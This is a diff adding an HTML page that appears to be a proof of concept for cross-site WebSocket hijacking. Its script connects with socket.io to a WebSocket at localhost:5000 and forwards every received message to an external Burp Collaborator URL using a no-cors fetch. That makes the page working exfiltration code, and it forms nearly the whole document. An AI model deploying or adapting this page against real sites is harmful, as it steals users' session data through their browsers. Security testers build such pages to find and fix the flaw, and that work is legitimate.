@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attempt to read websocket from different origin</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.1.2/socket.io.js" integrity="sha512-iZIBSs+gDyTH0ZhUem9eQ1t4DcEn2B9lHxfRMeGQhyNdSUz+rb+5A3ummX6DQTOIs1XK0gOteOg/LPtSo9VJ+w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</head>
+<body>
+  <h1>
+    An attempt to read websocket data from different origin
+  </h1>
+  <script>
+    let url = `ws://localhost:5000`
+    console.log(`current ws url: ${url}`);
+    const socket = io(url);
+    socket.on("message", data => {
+      fetch('https://f5l6m00i80xrl8q0fjtrn64t0k6auz.burpcollaborator.net/?'+data, {mode: 'no-cors'})
+    });
+  </script>
+</body>
+</html>
